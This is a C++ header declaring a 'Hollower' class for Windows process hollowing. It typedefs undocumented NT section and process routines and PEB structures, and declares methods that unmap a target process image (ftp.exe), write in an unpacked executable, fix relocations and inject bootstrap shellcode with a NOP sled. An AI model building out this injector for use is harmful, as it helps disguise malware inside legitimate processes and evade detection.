#pragma once
#include "PEData.h"
#include <string>
#include <vector>
#include "PEData.h"
#include <unordered_set>
#include "StringCryptor.h"

#define EXE_RSRC_OFFSET 0x200
/*********************************NT Routines - BEGIN***************************/
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(WINAPI *TNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

typedef NTSTATUS(WINAPI *TNtMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);

typedef NTSTATUS(WINAPI *TNtCreateSection)(
	PHANDLE SectionHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PLARGE_INTEGER MaximumSize,
	ULONG SectionPageProtection,
	ULONG AllocationAttributes,
	HANDLE FileHandle
	);

typedef NTSTATUS (WINAPI *TNtQueryInformationProcess)(
	_In_      HANDLE           ProcessHandle,
	_In_      unsigned int     ProcessInformationClass,
	_Out_     PVOID            ProcessInformation,
	_In_      ULONG            ProcessInformationLength,
	_Out_opt_ PULONG           ReturnLength
);
/***************************NT Routines - END*********************************/

class Hollower
{
public:
	Hollower(std::wstring targetProcPath, BYTE* unpackedExe);
	HANDLE DoHollow();
	~Hollower();

private:
	std::unordered_set<std::wstring> supportedRISCYHollowers = { L"C:\\Windows\\SysWOW64\\ftp.exe" };
	void* IATBootstrapLocalEP; /* address of local memory location of Bootstraping shellcode */
	void* IATBootstrapRemoteEP; /* address of remote memory location of Bootstraping shellcode */
	void* remoteNopBase; /* address of remote memory segment that was replaced with NOP sled */
	void *imageOffset; /*Injected Image shares same memory segment as shellcode, this defines 
					     the image offset within this segment*/
	bool riscySupportedProcess;
	void* localCodeSectionBase = NULL;
	void* localNopSectionBase = NULL;
	void* remoteCodeBase = NULL;
	void WriteSections(); //Writes exe sections to remote proc
	PEData *packedPEData,*hollowedPEData;
	void InjectBootstrapper(size_t IATInfoOffset); /* Loads, fixes-up, and writes bootstrapper shellcode */
	void FixRelocations(); /* fixes exe relocations to match remote proc's address base */
	void* GetRemoteImageBase();
	size_t containsStringSize=0;
	size_t IATshellcodeSize=0;
	size_t SerializeIATInfo(); /*Write all import info to memory that the shellcode bootstrapper can use*/
	std::wstring hollowedProcPath;
	HANDLE hRemoteThread;
	HANDLE hRemoteProc;
	HANDLE hNopSection;
	TNtUnmapViewOfSection NtUnmapViewOfSection;
	TNtMapViewOfSection NtMapViewOfSection;
	TNtCreateSection NtCreateSection;
	TNtQueryInformationProcess NtQueryInformationProcess;
	std::vector<PEData *> sections;

	/*************HOLLOW ROUTINES***************/
	static DWORD WINAPI MemHotswap(LPVOID lparam); /*thread (should be CRITICAL) that unmaps/maps remote image base
												   goal is to run this thread before remote proc thread's schedule*/
	void UnmapAtAddress(HANDLE proc, void* addr);
	bool MapAtAddress(HANDLE proc, HANDLE hSection, void* &remoteAddr);
	void MapBlankMemory();
	HANDLE CreateSectionBuffer(void* &base, SIZE_T size);
	void SwapMemory();
	bool StartRemoteProcess();

};

typedef struct _PEB_LDR_DATA {
	BYTE Reserved1[8];
	PVOID Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID Reserved3[2];
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
#pragma warning(push)
#pragma warning(disable: 4201) 
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	} DUMMYUNIONNAME;
#pragma warning(pop)
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE Reserved1[16];
	PVOID Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
	BYTE Reserved1[2];
	BYTE BeingDebugged;
	BYTE Reserved2[1];
	PVOID Reserved3[2];
	PPEB_LDR_DATA Ldr;
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
	PVOID Reserved4[3];
	PVOID AtlThunkSListPtr;
	PVOID Reserved5;
	ULONG Reserved6;
	PVOID Reserved7;
	ULONG Reserved8;
	ULONG AtlThunkSListPtr32;
	PVOID Reserved9[45];
	BYTE Reserved10[96];
	DWORD* PostProcessInitRoutine;
	BYTE Reserved11[128];
	PVOID Reserved12[1];
	ULONG SessionId;
} PEB, *PPEB;


